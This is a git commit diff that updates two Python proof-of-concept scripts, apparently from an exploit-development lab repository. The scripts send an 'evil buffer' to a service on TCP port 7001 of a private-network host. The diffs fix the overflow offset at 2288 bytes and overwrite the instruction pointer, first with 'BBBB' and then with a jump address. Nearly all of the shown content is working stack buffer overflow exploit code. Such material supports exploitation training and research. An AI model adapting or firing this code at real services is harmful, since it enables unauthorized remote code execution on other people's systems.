56c46ec53cb0200ca96f1436095e26d1d81d2040
5bhuv4n35h <10207922+5bhuv4n35h@users.noreply.github.com>
2020-06-08 04:28:10 +0530

    buffer

--- pocs/Vuln1_EIP.py
+++ pocs/Vuln1_EIP.py
@@ -4,11 +4,12 @@ import socket
 try:
   print "\nSending evil buffer..."
 
-  buffer = "A" * 0xA00
+  buffer ="A"*2288 + "B"*4+"C"*(2560-2288-4)
+
  
   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
   
-  s.connect(("192.168.176.227", 7001))
+  s.connect(("192.168.1.120", 7001))
   s.send(buffer)
   
   s.close()
@@ -17,3 +18,4 @@ try:
   
 except:
   print "\nCould not connect!"
+
--- pocs/Vuln1_jmp.py
+++ pocs/Vuln1_jmp.py
@@ -4,11 +4,11 @@ import socket
 try:
   print "\nSending evil buffer..."
 
-  buffer = "A" * 0xA00
+  buffer = buffer ="A"*2288 + "\xcf\x10\x80\x14"+"C" *(2560-2288-4)
  
   s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
   
-  s.connect(("192.168.176.227", 7001))
+  s.connect(("192.168.1.120", 7001))
   s.send(buffer)
   
   s.close()
